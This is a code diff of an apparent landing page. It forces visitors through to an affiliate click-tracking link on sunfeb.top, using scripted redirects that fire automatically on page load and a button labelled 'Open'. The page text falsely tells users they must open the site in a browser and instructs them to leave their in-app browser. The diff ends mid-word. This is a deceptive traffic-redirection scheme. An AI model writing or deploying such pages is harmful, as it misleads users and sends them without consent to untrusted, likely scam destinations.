@@ -65,15 +65,18 @@
   <script>
     const redirectUrl = "https://sunfeb.top/click?o=2&a=6873";
 
-    function tryRedirect() {
-      try {
-        window.location.href = redirectUrl;
-      } catch (e) {
-        console.error("Redirect failed, will retry...", e);
+    function safeRedirect() {
+      const win = window.open(redirectUrl, "_self");
+      if (!win) {
+        console.log("Redirect blocked.");
       }
     }
 
-    setInterval(tryRedirect, 1000);
+    // Первая попытка через 1 секунду
+    setTimeout(safeRedirect, 1000);
+
+    // Вторая попытка через 8 секунд
+    setTimeout(safeRedirect, 8000);
   </script>
 </head>
 <body>
@@ -81,7 +84,4 @@
     <h1>You must run browser to open this site.</h1>
     <p>1. Click the three dots in the top right corner</p>
     <p class="animated">2. Tap "Open in browser" from the menu that opens</p>
-    <button class="redirect-button" onclick="tryRedirect()">Open</button>
-  </div>
-</body>
-</html>
+    <button class="redirect-button" onclick="safeRedirect()">Откры
